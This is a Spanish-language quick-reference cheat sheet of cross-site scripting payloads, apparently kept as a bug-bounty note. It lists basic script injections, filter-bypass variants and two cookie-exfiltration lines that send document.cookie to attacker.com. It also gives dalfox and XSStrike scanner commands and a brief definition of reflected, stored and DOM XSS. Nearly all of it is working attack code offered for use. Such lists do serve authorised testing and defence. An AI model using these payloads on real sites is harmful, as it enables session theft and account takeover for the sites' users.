---
id: seed_1777131256338_cdpmli
title: Payloads XSS — Referencia Rápida
type: technique
tags: ["xss", "payloads", "bug-bounty", "ofensivo"]
created: 2026-04-25T15:34:16.338Z
updated: 2026-04-25T15:34:16.338Z
---

## XSS Básicos
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.domain)</script>
javascript:alert(1)
```

## XSS con Bypass de Filtros
```
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert`1`>
<details open ontoggle=alert(1)>
```

## XSS para Exfiltración de Cookies
```javascript
fetch('https://attacker.com/?c='+document.cookie)
new Image().src='https://attacker.com/?c='+btoa(document.cookie)
```

## XSS Stored vs Reflected vs DOM
- **Reflected**: payload en URL, ejecuta en respuesta inmediata
- **Stored**: payload persistido en DB, ejecuta para múltiples usuarios
- **DOM**: manipulación del DOM sin pasar por servidor

## Herramientas
- dalfox: `dalfox url "https://target.com/search?q=FUZZ"`
- XSStrike: `python3 xsstrike.py -u "https://target.com/search?q=test"`
- Burp Suite: Intruder + payloads manuales